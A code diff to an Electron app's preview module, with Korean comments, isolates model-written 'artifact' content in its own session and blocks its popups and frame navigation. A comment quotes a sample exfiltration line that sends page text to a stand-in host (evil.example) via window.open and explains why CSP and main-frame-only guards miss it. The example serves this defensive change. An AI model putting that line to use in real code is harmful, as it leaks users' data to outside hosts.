@@ -1,7 +1,8 @@
 import { app, session, shell, webContents } from 'electron'
 import type { WebContents } from 'electron'
-import { IPC, PREVIEW_PARTITION } from '@shared/types'
+import { ARTIFACT_PARTITION, IPC, PREVIEW_PARTITION } from '@shared/types'
 import type { ComposerAttachment, ImageAttachment, PreviewCaptureResult } from '@shared/types'
+import { ARTIFACT_ORIGIN } from '@shared/artifactUrl'
 import { previewLabel } from '@shared/devUrl'
 import { formatPickedElement } from '@shared/previewPick'
 import { cancelPick, pickElement } from './previewPicker'
@@ -27,6 +28,14 @@ const MAX_CAPTURE_WIDTH = 1600
 function isWebUrl(url: string): boolean {
   return /^https?:\/\//i.test(url)
 }
+
+/**
+ * 앱 창에 붙어도 되는 게스트 파티션. 이 목록 밖은 붙는 순간 거절된다.
+ *
+ * 둘로 나눠 둔 것 자체가 계약이다 — Preview 는 사용자의 dev 서버(웹을 돌아다녀도 된다),
+ * 아티팩트는 모델이 쓴 코드(아무 데도 못 간다). 세션이 같으면 규칙도 같아지므로 가를 수 없다.
+ */
+const GUEST_PARTITIONS: readonly string[] = [PREVIEW_PARTITION, ARTIFACT_PARTITION]
 
 /**
  * 콘솔·네트워크 문제 수집기. main 이 소유하고 개수만 렌더러로 흘린다([[previewIssues]]).
@@ -76,7 +85,7 @@ export function initPreview(dispatch: (channel: string, payload: unknown) => voi
       webPreferences.webviewTag = false
 
       // 파티션이 다르면 앱 세션의 쿠키·스토리지를 그대로 쓰게 된다. 그건 붙이지 않는다.
-      if (params.partition !== PREVIEW_PARTITION) {
+      if (!GUEST_PARTITIONS.includes(params.partition ?? '')) {
         log.error(`preview: refused a webview on partition "${params.partition ?? '(none)'}"`)
         event.preventDefault()
       }
@@ -84,6 +93,12 @@ export function initPreview(dispatch: (channel: string, payload: unknown) => voi
 
     // 여기서부터는 게스트(webview) 자신에게 거는 가드.
     if (contents.getType() !== 'webview') return
+
+    // 아티팩트 게스트는 규칙이 다르다 — 아래 가드는 Preview 전용이다.
+    if (contents.session === session.fromPartition(ARTIFACT_PARTITION)) {
+      guardArtifactGuest(contents)
+      return
+    }
 
     // 새 창·팝업은 앱 안에 띄우지 않는다 — 주소창도 닫을 방법도 없는 창이 되기 때문이다.
     // 웹 주소면 사용자의 기본 브라우저로 넘긴다(거기엔 주소창이 있다).
@@ -99,6 +114,48 @@ export function initPreview(dispatch: (channel: string, payload: unknown) => voi
       event.preventDefault()
       log.info(`preview: blocked navigation to ${url}`)
     })
+  })
+}
+
+/**
+ * 아티팩트 게스트에게 거는 이동 가드 — Preview 와 갈라지는 이유가 여기 다 있다.
+ *
+ * 위의 Preview 가드는 http(s) 이동을 **허용**하고 새 창 요청을 사용자의 기본 브라우저로
+ * 넘긴다. 미리보는 것이 사용자 자신의 dev 서버라면 맞는 판단이다.
+ *
+ * 모델이 쓴 코드에는 그게 유출 통로다:
+ *
+ * ```js
+ * window.open('https://evil.example/?d=' + encodeURIComponent(document.body.innerText))
+ * ```
+ *
+ * 이 한 줄이 사용자의 **진짜 브라우저**를 열어 방금 읽은 저장소 내용을 실어 보낸다.
+ * CSP 로는 못 막는다 — `navigate-to` 지시문은 표준에서 빠졌고 Chromium 에 없다. 그래서
+ * 이동은 세션 단위로 따로 막아야 한다.
+ *
+ * `will-navigate` 만으로는 부족하다 — 그건 **메인 프레임 전용**이다. 아티팩트가 iframe 을
+ * 만들어 그 안에서 이동하면 통과한다. `will-frame-navigate` 가 서브프레임까지 덮는다.
+ * (둘 다 `loadURL` 로는 안 뜨므로 우리가 버전을 갈아 끼우는 경로는 영향받지 않고,
+ * 해시 이동에도 안 떠서 아티팩트 안의 `<a href="#toc">` 는 그대로 동작한다.)
+ */
+function guardArtifactGuest(contents: WebContents): void {
+  contents.setWindowOpenHandler(({ url }) => {
+    log.info(`artifact: blocked a new window to ${url}`)
+    return { action: 'deny' }
+  })
+
+  const allowed = (url: string): boolean => url.startsWith(`${ARTIFACT_ORIGIN}/`)
+
+  contents.on('will-navigate', (event, url) => {
+    if (allowed(url)) return
+    event.preventDefault()
+    log.info(`artifact: blocked navigation to ${url}`)
+  })
+
+  contents.on('will-frame-navigate', (details) => {
+    if (allowed(details.url)) return
+    details.preventDefault()
+    log.info(`artifact: blocked frame navigation to ${details.url}`)
   })
 }
 
